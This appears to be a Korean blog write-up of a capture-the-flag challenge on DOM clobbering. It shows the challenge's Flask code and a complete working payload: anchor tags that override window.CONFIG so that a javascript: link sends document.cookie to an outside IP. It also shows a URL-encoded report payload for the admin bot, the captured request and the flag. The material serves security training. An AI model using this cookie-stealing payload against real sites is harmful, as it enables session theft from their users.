---
title: "[Writeup] Knockon Bootcamp - 7. Dom clobbering"
categories:
  - Web Hacking
tags:
  - Writeup
  - Knockon Bootcamp
  - Cross Site Scripting
  - DOM Based
  - DOM Clobbering
last_modified_at: 2024-09-15T14:00:00-05:00
published: true
---

|

## 문제

<http://war.knock-on.org:10010/>

![7. Dom clobbering 1](/assets/images/writeup/web-hacking/knock-on/7_DOM_1.png)

![7. Dom clobbering 2](/assets/images/writeup/web-hacking/knock-on/7_DOM_2.png)


### 목표

---

DOM 속성을 조작해 쿠키 탈취 

|

### 공격 기법

---

Cross Site Scripting

- DOM Based
- DOM Clobbering

|

|

|

## 문제 코드

```python
from flask import Flask, render_template, request, redirect, url_for, flash

import bleach
import os
import requests
import time

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

app = Flask(__name__)
CHROMEDRIVER_PATH = os.getenv("CHROMEDRIVER_PATH")
FLAG = os.getenv("SECRET_KEY")
localhost = "http://localhost:10010/"

@app.route("/")
def index():
    return render_template("index.html")

def read_url(url, cookie={"name": "name", "value": "value"}):
    driver = None
    try:
        service = Service(executable_path=CHROMEDRIVER_PATH)

        options = webdriver.ChromeOptions()
        options.add_argument("--headless")
        options.add_argument("--window-size=1920x1080")
        options.add_argument("--disable-gpu")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")

        driver = webdriver.Chrome(service=service, options=options)

        driver.implicitly_wait(3)
        driver.set_page_load_timeout(10)

        driver.get(localhost)
        driver.add_cookie(cookie)
        driver.get(url)

        time.sleep(3)

    except Exception as e:
        if driver:
            driver.quit()
        return False
    finally:
        if driver:
            driver.quit()
        return True

@app.route("/report", methods=["GET", "POST"])
def report():
    if request.method == "GET":
        return render_template("report.html")

    target_url = localhost + request.form["report_url"]

    if requests.get(target_url).status_code == 404:
        return render_template(
            "report.html", message="Invaild URL", localhost=localhost
        )

    cookie = {"name": "cookie", "value": FLAG}
    success = read_url(target_url, cookie)

    if success:
        message = f"Report success: {target_url}"
    else:
        message = f"Report failed: {target_url}"

    return render_template("report.html", message=message, localhost=localhost)

@app.route("/practice", methods=["GET"])
def practice():
    content = request.args.get("content")
    if not content:
        return render_template("practice.html")

    sanitized_content = bleach.clean(
        content,
        tags=["h1", "h2", "h3", "h4", "span", "a", "i", "b"],
        attributes=["id", "name", "href"],
        protocols=["http", "https", "javascript"],
    )
    return render_template("practice.html", content=sanitized_content)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10010, debug=True)
```

|

|

|

## 분석

### /report

---

![7. Dom clobbering 3](/assets/images/writeup/web-hacking/knock-on/7_DOM_3.png)

|

![7. Dom clobbering 4](/assets/images/writeup/web-hacking/knock-on/7_DOM_4.png)

```js
<script>
  document.getElementById("report-form").onsubmit = function (e) {
    e.preventDefault();
    this.action = "/report";
    this.submit();
  };
</script>
```

`report-form`폼을 제출했을 때 동작을 지정하는 함수

`e.preventDefault()`: 페이지를 다시 로드하지 않음

그냥 사용자 경험을 위해 있는 거 같음

|

|

### /practice

---

![7. Dom clobbering 5](/assets/images/writeup/web-hacking/knock-on/7_DOM_5.png)

`content`에 내용을 입력 후 Submit을 누르고 URL을 보면 GET방식으로 데이터를 처리하는 것을 알 수 있음

|

![7. Dom clobbering 6](/assets/images/writeup/web-hacking/knock-on/7_DOM_6.png)

```js
<script>
  window.CONFIG = window.CONFIG || {
    check: false,
    location: "http://ssh.knock-on.org:10010/",
  };

  if (window.CONFIG.check !== false) {
    location.href = window.CONFIG.location
  }
</script>
```

또한 스크립트 코드가 숨겨져있음

|

```js
window.CONFIG = window.CONFIG || {
  check: false,
  location: "http://ssh.knock-on.org:10010/",
};
```

`window.CONFIG`객체가 이미 존재하는지 확인하고, 존재하지 않으면 새로운 `{}`객체 할당

`window.CONFIG`가 이미 정의되어있다면 그 값을 유지하고,

그렇지 않으면 새로운 `{}`객체를 생성

이 부분을 이용해서 스크립트 실행 전에 `window.CONFIG`객체를 정의하여 해당 값을 실행하게 만들 수 있음

|

```js
if (window.CONFIG.check !== false) {
  location.href = window.CONFIG.location
}
```

`window.CONFIG.check`가 `false`가 아니라면, `location.herf`를 `window.CONFIG.location`에 설정된 URL로 설정하여 스크립트를 실행함

|

|

|

## 코드 분석

### practice()

---

```python
@app.route("/practice", methods=["GET"])
def practice():
    content = request.args.get("content")
    if not content:
        return render_template("practice.html")

    sanitized_content = bleach.clean(
        content,
        tags=["h1", "h2", "h3", "h4", "span", "a", "i", "b"],
        attributes=["id", "name", "href"],
        protocols=["http", "https", "javascript"],
    )
    return render_template("practice.html", content=sanitized_content)
```

```python
content = request.args.get("content")
if not content:
    return render_template("practice.html")
```

`GET`으로 `content`의 값을 받아 처리함

|

```python
sanitized_content = bleach.clean(
    content,
    tags=["h1", "h2", "h3", "h4", "span", "a", "i", "b"],
    attributes=["id", "name", "href"],
    protocols=["http", "https", "javascript"],
)
```

`bleach.clean()`함수로 화이트리스트를 정의

여기에 있는 태그, 속성,  프로토콜만 사용 가능

|

|

### report()

---

```python
@app.route("/report", methods=["GET", "POST"])
def report():
    if request.method == "GET":
        return render_template("report.html")

    target_url = localhost + request.form["report_url"]

    if requests.get(target_url).status_code == 404:
        return render_template(
            "report.html", message="Invaild URL", localhost=localhost
        )

    cookie = {"name": "cookie", "value": FLAG}
    success = read_url(target_url, cookie)

    if success:
        message = f"Report success: {target_url}"
    else:
        message = f"Report failed: {target_url}"

    return render_template("report.html", message=message, localhost=localhost)
```

```python
if request.method == "GET":
    return render_template("report.html")
```

`GET`요청이 들어오면 페이지 랜더링

|

```python
target_url = localhost + request.form["report_url"]

    if requests.get(target_url).status_code == 404:
        return render_template(
            "report.html", message="Invaild URL", localhost=localhost
        )

```

`POST`요청이면 `locathost`와 `report_url`폼 데이터를 결합해 `target_url`설정 

`target_url`로 `GET`요청을 보냈을 때 `404`이면 에러 메시지 출력

|

```python
cookie = {"name": "cookie", "value": FLAG}
success = read_url(target_url, cookie)

if success:
    message = f"Report success: {target_url}"
else:
    message = f"Report failed: {target_url}"
```

`target_url`이 유효하면 쿠키 전송

`read_url()`의 반환 값 여부를 `success`변수에 저장

`read_url()`함수 반환값이 있는 경우(`success`가 참인 경우), 성공 메시지.  아니면 실패 메시지 반환

|

|

|

## Exploit

```js
window.CONFIG = window.CONFIG || {
    check: true,
    location:"http//20.41.120.97:10010/",
};
if (window.CONFIG.check !== false) {
    location.href = window.CONFIG.location
}

```

`/practice`에 있는 스크립트 코드의 `window.CONFIG`객체를 위와 같이 `check: true`, `location: "공격자 서버 URL"`로 설정해줘야함

|

|

### window.CONFIG.check

---

```html
<a id="CONFIG" name="check">123</a>
```

`practive()`에 설정된 화이트 리스트를 기반으로 `<a>`태그와 `id`, `name` 속성을 활용

`window.CONFIG`객체의 `check`값을 설정. 이렇게 하면 `check: true`가 됨

|

|

### window.CONFIG.location

---

```html
<a id="CONFIG" name="location" href="http://20.41.120.97/">456</a>
```

`window.CONFIG.location`에는 URL 설정을 위해 `href`속성을 추가

이렇게 하면 페이지 랜더링과 동시에 `href`에 설정된 `URL`로 리다이렉션됨

|

```html
<a id="CONFIG" name="location" href=javascript:location.href="http://20.41.120.97/"+document.cookie>456</a>
```

쿠키 값을 넘겨주기 위해 `javascript`프로토콜을 활용

|

이렇게  `window.CONFIG`객체의 `check`와 `location`을 원하는대로 정의 완료

|

|

### Report URL

---

![7. Dom clobbering 7](/assets/images/writeup/web-hacking/knock-on/7_DOM_7.png)

이번 문제에서는 게시물을 업로드하는 기능이 없기 때문에, 봇이 해당 `post`의 `id`로 접근하는 식의 방법을 사용할 수 없음

|

```python
target_url = localhost + request.form["report_url"]
```

`report()` 에서 `target_url`을 `report_url`폼의 데이터를 결합해 설정하는 것을 활용해야함

|

|

### 인코딩된 URL 얻기

---

```html
<a id="CONFIG" name="check"></a>
<a id="CONFIG" name="location" href=javascript:location.href="http://20.41.120.97/"+document.cookie></a>
```

![7. Dom clobbering 8](/assets/images/writeup/web-hacking/knock-on/7_DOM_8.png)

![7. Dom clobbering 9](/assets/images/writeup/web-hacking/knock-on/7_DOM_9.png)

`/practive`에서 내용 입력 후 Submit을 누르면

개발자도구의 `Network` 탭에서 인코딩된 URL을 얻을 수 있음

|

|

### Report URL 2

```python
target_url="http://localhost:10010/"+"practive?content=..."
```

![7. Dom clobbering 10](/assets/images/writeup/web-hacking/knock-on/7_DOM_10.png)

`/report`에서 `"practive?content=..."`형식의 인코딩된 URL을 넘겨주면 됨

|

|

### 결과

---

```sh
GET /cookie=K0%7Bcl0bb3r1ng_4_D00M_w1th_D0M%7D HTTP/1.1
Host: 20.41.120.97:10010
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/126.0.6478.126 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://localhost:10010/
Accept-Encoding: gzip, deflate

```

|

|

|

## Payload

### /practice

```html
<a id="CONFIG" name="check"></a>
<a id="CONFIG" name="location" href=javascript:location.href="http://20.41.120.97/"+document.cookie></a>
```

|

### /report

```sh
practice?content=%3Ca+id%3D%22CONFIG%22+name%3D%22check%22%3E%3C%2Fa%3E%0D%0A%3Ca+id%3D%22CONFIG%22+name%3D%22location%22+href%3Djavascript%3Alocation.href%3D%22https%3A%2F%2F20.41.120.97%2F%22%2Bdocument.cookie%3E%3C%2Fa%3E
```

|

|

### FLAG

---

```sh
K0{cl0bb3r1ng_4_D00M_w1th_D0M}
```

|

---